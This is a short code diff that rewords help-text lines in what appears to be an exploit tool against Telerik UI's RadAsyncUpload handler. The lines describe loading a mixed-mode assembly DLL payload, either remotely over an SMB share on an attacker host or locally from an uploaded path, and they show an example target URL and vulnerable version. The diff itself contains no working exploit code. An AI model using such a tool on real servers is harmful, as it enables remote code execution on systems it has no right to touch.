@@ -440,8 +440,8 @@ def mode_help():
         "Check remote SMB payload capability -r lhost url [proxy]\n\n" +
         #    E.g. Responder/Collaborator
 
-        "Load remote payload                 -R lhost/share/mixed_mode_assembly.dll url [proxy]\n\n" +
-        "Load local payload                  -L c:/users/public/documents/mixed_mode_assembly.dll url [proxy]\n\n" +
+        "Load remote SMB dll payload         -R lhost/share/mixed_mode_assembly.dll url [proxy]\n\n" +
+        "Trigger local uploaded dll payload  -L c:/users/public/documents/mixed_mode_assembly.dll url [proxy]\n\n" +
 
         "Example URL:               http://target/Telerik.Web.UI.WebResource.axd?type=rau\n" +
         "Example Version:           2016.2.504\n" +
